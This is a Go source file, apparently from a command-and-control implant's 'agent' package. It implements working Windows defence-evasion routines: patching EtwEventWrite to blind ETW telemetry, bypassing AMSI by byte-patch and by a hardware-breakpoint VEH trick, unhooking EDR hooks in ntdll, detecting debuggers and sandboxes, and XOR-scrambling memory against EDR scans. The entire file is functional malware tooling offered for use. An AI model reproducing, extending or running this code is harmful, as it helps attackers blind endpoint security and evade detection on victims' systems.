//go:build windows

package agent

// Startup evasion patches applied once before the beacon loop.
//
//  patchETW    — overwrites EtwEventWrite with xor rax,rax;ret, blinding
//                process-level ETW telemetry used by most EDRs.
//  patchAMSI   — overwrites AmsiScanBuffer with mov eax,E_INVALIDARG;ret,
//                bypassing .NET assembly scanning (needed before exec-asm).
//  unhookNtdll — loads a clean ntdll copy from disk and restores any function
//                whose prologue has been overwritten with a JMP hook.

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procLoadLibraryExW            = kernel32.NewProc("LoadLibraryExW")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	procSleep                     = kernel32.NewProc("Sleep")
	procGetCurrentThread          = kernel32.NewProc("GetCurrentThread")
)

// CONTEXT_DEBUG_REGISTERS reads Dr0–Dr3 in addition to the control flags.
const CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10

// Debug register offsets inside the raw x64 CONTEXT buffer.
const (
	ctxDr0Off = 0x48
	ctxDr1Off = 0x50
	ctxDr2Off = 0x58
	ctxDr3Off = 0x60
)

const dontResolveDLLReferences = 0x00000001

// patchETW overwrites EtwEventWrite with xor rax,rax; ret.
func patchETW() {
	defer func() { recover() }() // ACG on Win Server 2022 can cause SEH → Go panic
	proc := ntdll.NewProc("EtwEventWrite")
	if proc.Find() != nil {
		return
	}
	writeCodePatch(proc.Addr(), []byte{0x48, 0x31, 0xC0, 0xC3})
}

// disableETWProcess disables ETW tracing for this process via NtSetInformationProcess.
// This is complementary to patchETW(): no function bytes are modified,
// making it invisible to memory-integrity checks that detect the EtwEventWrite patch.
func disableETWProcess() {
	const ProcessEnableReadWriteVmLogging = 87
	proc := ntdll.NewProc("NtSetInformationProcess")
	flag := uint32(0)
	proc.Call(
		uintptr(0xFFFFFFFF), // current process pseudo-handle
		uintptr(ProcessEnableReadWriteVmLogging),
		uintptr(unsafe.Pointer(&flag)),
		unsafe.Sizeof(flag),
	)
}

// patchAMSI overwrites AmsiScanBuffer with mov eax, E_INVALIDARG; ret.
// amsi.dll treats this as a failed scan → result defaults to clean.
func patchAMSI() {
	defer func() { recover() }() // ACG on Win Server 2022 can cause SEH → Go panic
	modA := windows.NewLazySystemDLL("amsi.dll")
	proc := modA.NewProc("AmsiScanBuffer")
	if proc.Find() != nil {
		return // amsi.dll not loaded in this process — no-op
	}
	writeCodePatch(proc.Addr(), []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3})
}

// writeCodePatch temporarily flips a code page RW, writes bytes, then restores.
// Uses NtProtectVirtualMemory (ntdll) rather than VirtualProtect (kernel32).
// Returns false if the protect call fails (e.g. ACG is enabled on this process).
func writeCodePatch(addr uintptr, patch []byte) (ok bool) {
	size := uintptr(len(patch))
	var old uint32
	status, _, _ := procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&old)),
	)
	if status != 0 {
		return false // ACG or other mitigation blocked the page flip
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)), patch)
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
	return true
}

// ── Patchless AMSI bypass via hardware breakpoint + VEH ──────────────────────

// amsiVEHTarget holds the address of AmsiScanBuffer for the VEH handler to check.
var (
	amsiVEHTarget uintptr
	amsiVEHHandle uintptr
)

// patchAMSIVEH installs a hardware breakpoint on AmsiScanBuffer and registers
// a VEH handler that intercepts the breakpoint and returns AMSI_RESULT_CLEAN (1).
// Unlike the byte-patch approach, zero bytes of amsi.dll are modified.
func patchAMSIVEH() {
	defer func() { recover() }()
	modA := windows.NewLazySystemDLL("amsi.dll")
	proc := modA.NewProc("AmsiScanBuffer")
	if proc.Find() != nil {
		return // amsi.dll not loaded
	}
	target := proc.Addr()
	amsiVEHTarget = target

	// Install hardware breakpoint on DR0 of current thread
	h, _, _ := procGetCurrentThread.Call()
	if h == 0 {
		return
	}

	// Use raw buffer CONTEXT (same approach as hwbp_windows.go)
	buf := make([]byte, ctxSize+16)
	offset := uintptr(unsafe.Pointer(&buf[0])) & 0xF
	if offset != 0 {
		buf = buf[16-offset:]
	}
	ctx := buf[:ctxSize]
	binary.LittleEndian.PutUint32(ctx[ctxFlagsOff:], CONTEXT_DEBUG_REGISTERS)

	r, _, _ := procGetThreadContext.Call(h, uintptr(unsafe.Pointer(&ctx[0])))
	if r == 0 {
		return
	}

	// Set DR0 = target address, DR7 = enable local breakpoint on DR0 (execute condition)
	binary.LittleEndian.PutUint64(ctx[ctxDr0Off:], uint64(target))
	// DR7: local enable bit 0 (G0E=0, L0E=1), condition=execute (00), size=1byte (00)
	binary.LittleEndian.PutUint64(ctx[0x70:], 0x00000001) // Dr7 at 0x70

	procSetThreadContext.Call(h, uintptr(unsafe.Pointer(&ctx[0])))

	// Register VEH handler
	addVEH(target)
}

// addVEH registers the AMSI VEH callback via AddVectoredExceptionHandler.
func addVEH(target uintptr) {
	amsiVEHTarget = target
	cb := windows.NewCallback(amsiVEHCallback)
	addVEHProc := kernel32.NewProc("AddVectoredExceptionHandler")
	amsiVEHHandle, _, _ = addVEHProc.Call(1, cb) // first=1 → first in chain
}

// amsiVEHCallback is the VEH handler. When EXCEPTION_SINGLE_STEP fires at
// AmsiScanBuffer, it sets RAX=1 (AMSI_RESULT_CLEAN) and disables DR7.
func amsiVEHCallback(info uintptr) uintptr {
	if info == 0 {
		return 0 // EXCEPTION_CONTINUE_SEARCH
	}
	// EXCEPTION_POINTERS layout (64-bit):
	//   offset 0: *EXCEPTION_RECORD
	//   offset 8: *CONTEXT
	exRec := *(*uintptr)(unsafe.Pointer(info))
	if exRec == 0 {
		return 0
	}
	// EXCEPTION_RECORD:
	//   offset 0: ExceptionCode uint32
	//   offset 8: ExceptionAddress uintptr (after flags/numParams fields)
	// Actually: Code(4), Flags(4), Record*(8), Address(8)
	code := *(*uint32)(unsafe.Pointer(exRec))
	addr := *(*uintptr)(unsafe.Pointer(exRec + 16)) // ExceptionAddress at offset 16
	if code == 0x80000004 && addr == amsiVEHTarget {  // EXCEPTION_SINGLE_STEP
		// Get CONTEXT from EXCEPTION_POINTERS at offset 8
		ctx := (*[ctxSize]byte)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(info + 8))))
		if ctx == nil {
			return 0
		}
		// Set RAX = 1 (AMSI_RESULT_CLEAN) — RAX offset in CONTEXT is 0x78
		binary.LittleEndian.PutUint64(ctx[0x78:], 1)
		// Clear DR7 to disable the breakpoint
		binary.LittleEndian.PutUint64(ctx[0x70:], 0)
		return ^uintptr(0) // EXCEPTION_CONTINUE_EXECUTION (-1)
	}
	return 0 // EXCEPTION_CONTINUE_SEARCH
}

// isDebugged returns true if a debugger or instrumented sandbox is detected.
// Uses two checks:
//   1. NtQueryInformationProcess(ProcessDebugPort=7) — kernel sets this to -1 when
//      a user-mode debugger is attached (OllyDbg, x64dbg, WinDbg user-mode, etc.)
//   2. Timing — sandboxes sometimes accelerate Sleep to skip long waits; a 1 ms
//      sleep that returns in >500 ms indicates time manipulation.
func isDebugged() bool {
	var debugPort uintptr
	procNtQueryInformationProcess.Call(
		uintptr(windows.CurrentProcess()),
		7, // ProcessDebugPort
		uintptr(unsafe.Pointer(&debugPort)),
		unsafe.Sizeof(debugPort),
		0,
	)
	if debugPort != 0 {
		return true
	}
	t0 := time.Now()
	procSleep.Call(1)
	if time.Since(t0) > 500*time.Millisecond {
		return true
	}
	return false
}

// unhookNtdll loads a fresh copy of ntdll.dll from disk (without running
// DllMain) and overwrites any hooked exports with clean prologue bytes.
// Removes all user-mode JMP/INT3 hooks planted by EDR drivers.
func unhookNtdll() {
	defer func() { recover() }() // ACG on Win Server 2022 can panic during page flips
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	pathW, err := windows.UTF16PtrFromString(sysroot + `\System32\ntdll.dll`)
	if err != nil {
		return
	}

	// Load fresh copy — sections at their virtual offsets, DllMain not called.
	cleanH, _, _ := procLoadLibraryExW.Call(
		uintptr(unsafe.Pointer(pathW)),
		0,
		dontResolveDLLReferences,
	)
	if cleanH == 0 {
		return
	}
	defer windows.FreeLibrary(windows.Handle(cleanH))

	loadedH, _ := windows.LoadLibrary("ntdll.dll")
	if loadedH == 0 {
		return
	}

	restoreHookedExports(uintptr(loadedH), cleanH)
}

// hasHWBreakpoints returns true if a debugger or EDR has set hardware debug
// registers DR0–DR3 on the current thread (used to intercept specific addresses).
func hasHWBreakpoints() bool {
	buf := make([]byte, ctxSize+16)
	offset := uintptr(unsafe.Pointer(&buf[0])) & 0xF
	if offset != 0 {
		buf = buf[16-offset:]
	}
	ctx := buf[:ctxSize]
	binary.LittleEndian.PutUint32(ctx[ctxFlagsOff:], CONTEXT_DEBUG_REGISTERS)

	hThread, _, _ := procGetCurrentThread.Call()
	r, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx[0])))
	if r == 0 {
		return false
	}
	return binary.LittleEndian.Uint64(ctx[ctxDr0Off:]) != 0 ||
		binary.LittleEndian.Uint64(ctx[ctxDr1Off:]) != 0 ||
		binary.LittleEndian.Uint64(ctx[ctxDr2Off:]) != 0 ||
		binary.LittleEndian.Uint64(ctx[ctxDr3Off:]) != 0
}

// checkHooks scans the prologues of key NT and Win32 functions and reports
// any that have been overwritten with JMP/CALL/INT3 trampoline hooks by an EDR.
// Returns a human-readable report suitable for sending as a task result.
func checkHooks() string {
	targets := []struct{ dll, name string }{
		{"ntdll.dll", "NtOpenProcess"},
		{"ntdll.dll", "NtAllocateVirtualMemory"},
		{"ntdll.dll", "NtWriteVirtualMemory"},
		{"ntdll.dll", "NtProtectVirtualMemory"},
		{"ntdll.dll", "NtCreateThreadEx"},
		{"ntdll.dll", "NtQueueApcThread"},
		{"ntdll.dll", "NtMapViewOfSection"},
		{"ntdll.dll", "LdrLoadDll"},
		{"ntdll.dll", "EtwEventWrite"},
		{"kernel32.dll", "CreateRemoteThread"},
		{"kernel32.dll", "VirtualAllocEx"},
		{"kernel32.dll", "WriteProcessMemory"},
		{"kernel32.dll", "OpenProcess"},
		{"amsi.dll", "AmsiScanBuffer"},
	}

	var sb strings.Builder
	hookedCount := 0
	for _, tgt := range targets {
		mod := windows.NewLazySystemDLL(tgt.dll)
		proc := mod.NewProc(tgt.name)
		if proc.Find() != nil {
			fmt.Fprintf(&sb, "[skip]   %s!%s (not loaded)\n", tgt.dll, tgt.name)
			continue
		}
		addr := proc.Addr()
		if addr == 0 {
			continue
		}
		b0 := *(*byte)(unsafe.Pointer(addr))
		b1 := *(*byte)(unsafe.Pointer(addr + 1))
		b2 := *(*byte)(unsafe.Pointer(addr + 2))

		var reason string
		switch b0 {
		case 0xE9:
			reason = "JMP rel32"
		case 0xE8:
			reason = "CALL rel32"
		case 0xCC:
			reason = "INT3"
		case 0xEB:
			reason = "JMP short"
		case 0xFF:
			if b1 == 0x25 {
				reason = "JMP [rip+X] (absolute)"
			}
		}
		if reason != "" {
			hookedCount++
			fmt.Fprintf(&sb, "[HOOKED] %s!%s @ 0x%x — %s\n", tgt.dll, tgt.name, addr, reason)
		} else {
			fmt.Fprintf(&sb, "[clean]  %s!%s (0x%02x 0x%02x 0x%02x)\n", tgt.dll, tgt.name, b0, b1, b2)
		}
	}

	if hookedCount == 0 {
		sb.WriteString("\n[+] No hooks detected in scanned functions\n")
	} else {
		fmt.Fprintf(&sb, "\n[!] %d hook(s) detected — run UNHOOK_NTDLL before sensitive ops\n", hookedCount)
	}
	return sb.String()
}

// ── Memory scrambler daemon ───────────────────────────────────────────────────
//
// Periodically XOR-scrambles registered byte slices to defeat periodic EDR
// memory scanners (e.g., MDE's periodic scans every 30–120s).
// Slices are descrambled automatically before the goroutine stops.

var (
	scrambleMu      sync.Mutex
	scrambleStop    chan struct{}
	scrambleTargets [][]byte
	scrambleKey     = byte(0xA7)
)

// RegisterScramblerTarget adds buf to the set of slices scrambled by the daemon.
// Must be called before StartScramblerDaemon.
func RegisterScramblerTarget(buf []byte) {
	scrambleMu.Lock()
	defer scrambleMu.Unlock()
	scrambleTargets = append(scrambleTargets, buf)
}

// StartScramblerDaemon starts a goroutine that XOR-scrambles all registered
// targets every interval. Safe to call repeatedly — stops any previous instance.
func StartScramblerDaemon(interval time.Duration) {
	StopScramblerDaemon()
	ch := make(chan struct{})
	scrambleStop = ch
	go func() {
		tick := time.NewTicker(interval)
		defer tick.Stop()
		encrypted := false
		for {
			select {
			case <-tick.C:
				scrambleMu.Lock()
				for _, buf := range scrambleTargets {
					for i := range buf {
						buf[i] ^= scrambleKey
					}
				}
				encrypted = !encrypted
				scrambleMu.Unlock()
			case <-ch:
				if encrypted {
					scrambleMu.Lock()
					for _, buf := range scrambleTargets {
						for i := range buf {
							buf[i] ^= scrambleKey
						}
					}
					scrambleMu.Unlock()
				}
				return
			}
		}
	}()
}

// StopScramblerDaemon stops the scrambler and ensures all targets are decrypted.
func StopScramblerDaemon() {
	if scrambleStop != nil {
		close(scrambleStop)
		scrambleStop = nil
	}
}

// restoreHookedExports walks the PE export table of loadedBase, detects
// functions whose first byte is an E9/E8/CC hook, and restores the first
// 16 bytes from the corresponding address in cleanBase.
func restoreHookedExports(loadedBase, cleanBase uintptr) {
	defer func() { recover() }()
	// PE header offset at DOS+60
	elfanew := uintptr(*(*uint32)(unsafe.Pointer(loadedBase + 60)))
	peHdr := loadedBase + elfanew

	// Export directory RVA at PE+24(optional hdr)+112(DataDirectory[0].VirtualAddress)
	exportDirRVA := uintptr(*(*uint32)(unsafe.Pointer(peHdr + 136)))
	if exportDirRVA == 0 {
		return
	}

	// IMAGE_EXPORT_DIRECTORY fields
	expDir := loadedBase + exportDirRVA
	numFunctions := uint32(*(*uint32)(unsafe.Pointer(expDir + 20)))
	addrOfFunctions := uint32(*(*uint32)(unsafe.Pointer(expDir + 28)))

	funcTable := loadedBase + uintptr(addrOfFunctions)

	for i := uint32(0); i < numFunctions; i++ {
		funcRVA := uintptr(*(*uint32)(unsafe.Pointer(funcTable + uintptr(i)*4)))
		if funcRVA == 0 {
			continue
		}
		loadedAddr := loadedBase + funcRVA
		cleanAddr := cleanBase + funcRVA

		first := *(*byte)(unsafe.Pointer(loadedAddr))
		if first != 0xE9 && first != 0xE8 && first != 0xCC {
			continue // not hooked
		}

		const patchSz = 16
		addr := loadedAddr
		sz := uintptr(patchSz)
		var old uint32
		procNtProtectVirtualMemory.Call(
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&addr)),
			uintptr(unsafe.Pointer(&sz)),
			uintptr(windows.PAGE_EXECUTE_READWRITE),
			uintptr(unsafe.Pointer(&old)),
		)
		copy(
			unsafe.Slice((*byte)(unsafe.Pointer(loadedAddr)), patchSz),
			unsafe.Slice((*byte)(unsafe.Pointer(cleanAddr)), patchSz),
		)
		procNtProtectVirtualMemory.Call(
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&addr)),
			uintptr(unsafe.Pointer(&sz)),
			uintptr(old),
			uintptr(unsafe.Pointer(&old)),
		)
	}

}
